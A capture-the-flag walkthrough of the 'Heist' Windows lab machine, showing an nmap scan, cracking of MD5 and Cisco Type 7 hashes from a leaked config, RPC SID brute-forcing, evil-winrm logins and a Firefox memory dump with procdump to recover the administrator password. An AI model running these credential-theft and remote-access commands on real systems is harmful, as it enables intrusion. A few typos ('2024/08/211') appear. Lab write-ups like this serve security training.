# Heist Walkthrough

Date: 2024/08/211.

## Ports Enumeration

I began with a full port scan to identify open services on the target machine:

```bash
nmap -Pn -p 80,135,445,5985,49669 -A -v -oN scan.txt -oX scan.xml <target>
```

The scan revealed the following open ports and services:

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
```

The target is likely running Microsoft Windows Server 2019 based on the OS fingerprint.2.

## Port 80 (HTTP) Enumeration

Navigating to the web server on port 80 presented a login page. The page allowed login either as an authenticated user or as a guest.

### Guest Login:

Logging in as a guest provided some valuable information:

Users:
* `admin`
* `rout3r`
* `hazard`

Configuration File:

* Located at http://heist.htb/attachments/config.txt, which contained encrypted passwords.

### Decrypting Passwords

The configuration file provided three encrypted passwords:

* `$1$pdQG$o8nrSzsGXeaduXrjlvKc91` (MD5 hash)
* `0242114B0E143F015F5D1E161713` (Cisco Type 7)
* `02375012182C1A1D751618034F36415408` (Cisco Type 7)

### MD5 Hash:

The first password is encrypted using MD5 (indicated by the $1$ prefix). I decrypted it using hashcat:

```bash
hashcat -m 500 <password_file> /usr/share/wordlists/rockyou.txt
```

### Cisco Type 7:

The other two passwords were Cisco Type 7 encrypted, which I decrypted using an online tool: [Cisco Password Cracker](https://www.ifm.net.nz/cookbooks/passwordcracker.html).

Decrypted passwords:

* `stealth1agent`
* `$uperP@ssword`
* `Q4)sJu\Y8qz*A3?d`

## Initial Access via RPC

Using the `hazard` credentials, I gained access via the RPC protocol with `rpcclient`:

```bash
rpcclient -U "hazard" --password="stealth1agent" <target>
```

## User Enumeration:

To enumerate users, I used a script that cycles through possible SIDs:

```bash
for i in {0..1050}; do 
  rpcclient -U "hazard%stealth1agent" <target> -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i"
done
```

This revealed several new users, including:

* SUPPORTDESK\Administrator
* SUPPORTDESK\Chase

## Gaining User Access via WinRM

With the `Chase` credentialsn, I connected to the target using WinRM:

```bash
evil-winrm -i <target> -u chase -p "Q4)sJu\Y8qz*A3?d"
```

I successfully obtained the user flag from the Chase account.

## Privilege Escalation to Administrator

### Enumeration

On the desktop, I found a `todo.txt` file with minimal hints. I used `winPEAS` for automated enumeration but found nothing conclusive. However, I noticed active Firefox processes and decided to dump their memory:

```powershell
Get-Process | Where-Object { $_.ProcessName -eq "firefox" }
```

### Dumping Firefox Memory

Using `procdump`, I dumped the Firefox process:

```powershell
.\procdump.exe 6696 -accepteula
```

Within the dump files, I discovered the administrator password: `4dD\!5}x/re8]FBuZ`.

## Accessing the Administrator Account

Finally, I logged in as Administrator using the discovered credentials and obtained the root flag:

```bash
evil-winrm -i <target> -u administrator -p "4dD\!5}x/re8]FBuZ"
```

## Summary

This box required careful enumeration and persistence. The initial access was challenging but rewarding as I gained further insight into Windows enumeration techniques. The privilege escalation, particularly through process memory dumping, provided a valuable learning experience.

### Key Takeaways:

* Web enumeration and password decryption
* RPC enumeration techniques
* Utilizing WinRM for remote access
* Process dumping and analysis for privilege escalation